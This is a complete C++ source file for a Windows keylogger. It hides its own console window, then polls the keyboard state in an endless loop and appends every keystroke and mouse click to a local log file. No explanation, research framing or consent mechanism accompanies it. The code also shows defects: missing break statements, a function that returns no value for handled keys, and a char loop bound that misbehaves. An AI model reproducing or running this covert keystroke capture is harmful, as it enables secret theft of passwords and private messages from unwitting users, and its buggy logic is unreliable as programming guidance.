#include<Windows.h>
#include<fstream>
#include<stdio.h>
#include<string>
#include<winuser.h>
#include<conio.h>
#include<stdlib.h>
using namespace std;
void Stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}
void capture(string data)
{
    ofstream dfile;
    dfile.open("LogFile.txt", fstream::app);
    dfile << data;
    printf("%s \n",data);
    dfile.close();
}
bool Keylist(int bKey)
{
    switch (bKey)
    {
    case VK_OEM_PERIOD:
        capture(".");
        break;
    case VK_RETURN:
        capture("\n");
        break;
    case VK_BACK:
        capture("(BACKSPACE)");
        break;
    case VK_SPACE:
        capture(" ");
        break;
    case VK_SHIFT:
        capture("(SHIFT)");
        break;
    case VK_RSHIFT:
        capture("(RSHIFT)");
    case VK_CONTROL:
        capture("(CTRL)");
        break;
    case VK_ESCAPE:
        capture("(ESC)");
        break;
    case VK_LBUTTON:
        capture("(LMOUSE)");
        break;
    case VK_RBUTTON:
        capture("(RMOUSE)");
        break;
    case VK_MBUTTON:
        capture("(MMOUSE)");
        break;
    case VK_TAB:
        capture("(TAB)");
        break;
    case VK_MENU:
        capture("(ALT)");
        break;
    case VK_UP:
        capture("(UP_KEY)");
        break;
    case VK_DOWN:
        capture("DOWN_KEY)");
        break;
    case VK_LEFT:
        capture("(LEFT_KEY)");
        break;
    case VK_RIGHT:
        capture("(RIGHT_KEY)");
        break;
    case VK_DELETE:
        capture("(DEL)");
        break;
    case 0x30:
        capture("0");
        break;
    case 0x31:
        capture("1");
        break;
    case 0x32:
        capture("2");
        break;
    case 0x33:
        capture("3");
        break;
    case 0x34:
        capture("4");
        break;
    case 0x35:
        capture("5");
        break;
    case 0x36:
        capture("6");
        break;
    case 0x37:
        capture("7");
        break;
    case 0x38:
        capture("8");
        break;
    case 0x39:
        capture("9");
        break;
    case VK_NUMPAD0:
        capture("0");
        break;
    case VK_NUMPAD1:
        capture("1");
        break;
    case VK_NUMPAD2:
        capture("2");
        break;
    case VK_NUMPAD3:
        capture("3");
        break;
    case VK_NUMPAD4:
        capture("4");
        break;
    case VK_NUMPAD5:
        capture("5");
        break;
    case VK_NUMPAD6:
        capture("6");
        break;
    case VK_NUMPAD7:
        capture("7");
        break;
    case VK_NUMPAD8:
        capture("8");
        break;
    case VK_NUMPAD9:
        capture("9");
        break;
    case VK_OEM_CLEAR:
        capture("(CLEAR)");
        break;
    case VK_CAPITAL:
        capture("(CAPS_LOCK)");
    default: return false;

    }
}
int main()
{       
        Stealth();
        system("cls");
        char key;
        while(1)
        {
            Sleep(10);
            for(key=8;key<=255;key++)
            {   
                if(GetAsyncKeyState(key)==-32767)
                {
                    if (Keylist(key) == 0)
                    {
                        printf("%c \n", key);
                        ofstream dfile;
                        dfile.open("LogFile.txt", fstream::app);
                        dfile << key;
                        dfile.close();
                    }
                }
            }
        }
        return 0;
}

